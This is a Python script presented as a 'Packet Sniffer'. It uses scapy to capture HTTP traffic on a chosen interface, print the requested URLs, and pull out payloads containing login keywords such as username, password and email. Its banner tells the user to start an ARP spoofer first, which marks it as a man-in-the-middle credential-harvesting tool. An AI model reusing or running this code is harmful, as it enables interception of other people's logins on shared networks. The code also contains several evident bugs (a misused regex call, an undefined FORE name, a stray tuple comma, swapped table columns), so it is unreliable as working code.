import time
from colorama import Fore, Style

import psutil
import subprocess
from scapy.all import *
import re
from prettytable import PrettyTable

choice = "N"


# get the current mac addr
def get_mac(interface):
    try:
        output = subprocess.check_output(["ifconfig", interface])
        return re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(output).group(0))
    except:
        pass


# get the ip


def getIp(interface):
    output = subprocess.check_output(["ifconfig", interface])

    # compiles, decodes, searchs'
    pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
    output1 = output.decode()
    ipAddr = pattern.search(output1)[0]
    return ipAddr


# the ip table


def ipTable():
 addrs = psutil.net_if_addrs()
 p = PrettyTable([f"{Fore.GREEN}Interface", "Mac Address", f"IP Address{Style.RESET_ALL}"])
 for k, v in addrs.items():
  mac = get_mac(k),
  ip = getIp(k)
  if mac and ip:
   p.add_row([k,ip,mac])
  elif mac:
   p.add_row([k, mac,f"{Fore.YELLOW}NO ip assigned{Style.RESET_ALL}"])
  elif ip:
   p.add_row([k, f"{Fore.YELLOW}No mac assigned{Style.RESET_ALL}",ip])
 print(p)		




#sniff it!!!!!!!

def sniffIt(interface):
	scapy.all.sniff(iface=interface, store=False, prn=process_those_packets)
	#to filter out packets \||/
	#scapy.all.sniffIt(iface=interface, store=false, prn=process_those_packets, filter="port 4444")



#packet processin
def process_those_packets(packet):
	if packet.haslayer(http.HTTPRequest):
		print("[/] HTTP REQ >>>>>>")
		url_extractor(packet)
		info = get_login_info(packet)
		if info:
			print(f"{FORE.GREEN} [+] Username or pass is ", info, f"{Style.RESET_ALL}")
		if(choice=="Y" or choice=="y"):
			raw_http_request(packet)





#url_extractor
def url_extractor(packet):
	http_layer = packet.getlayer('HTTPRequest').fields
	ip_layer = packet.getlayer('IP').fields
	print(ip_layer["src"], "just requested \n", http_layer["Method"].decode(), " ", http_layer["Host"].decode(), " ", http_layer["Path"].decode())						
	return



#get_login_info
def get_login_info(packet):
	if packet.haslayer(scapy.all.Raw):
		load = packet[scapy.all.Raw].load
		load_decode = load.decode()
		keywords = ["username", "user", "pass", "login", "Password", "Username", "email"]
		for f in keywords:
			if f in load_decode:
				return load_decode




#raw http req
def raw_http_request(packet):
	httplayer = packet[http.HTTPRequest].fields
	print("-=-=-=-=-=-Raw http Packet-=-=-=-=-=-")
	print("{:<8} {:<15}".format('Key', 'Label'))
	try:
		for k, v in httplayer.items():
			try:
				label = v.decode()
			except:
				pass
			print("{:<40} {:<15}".format(k,label))
	except KeyboardInterrupt:
		print("\n[+] Interrutptions detected, Quitting!")
	print("======================================")
	print(httplayer)


#THE MAIN FUNC
def mainSniff():
	print(f"{Fore.BLUE}Welcome to the Packet Sniffer{Style.RESET_ALL}")
	print(f"{Fore.YELLOW}[^*^*] Start the arp spoofer [^*^*] {Style.RESET_ALL}")
	try:
		global choice
		choice = input("[+] Do u wanna print the raw packet? : Y/N : ")
		ipTable()
		interface = input("[+] Enter the name of the interface: ")
		print("[+] Sniffin Packet!!")
		sniffIt(interface)
		print(f"{Fore.YELLOW}\n[+] Exitin!!! {Style.RESET_ALL}")
		time.sleep(3)
	except KeyboardInterrupt:
		print(f"{Fore.RED}\n[!] Exitin!!!{Style.RESET_ALL}")
		time.sleep(3)

mainSniff()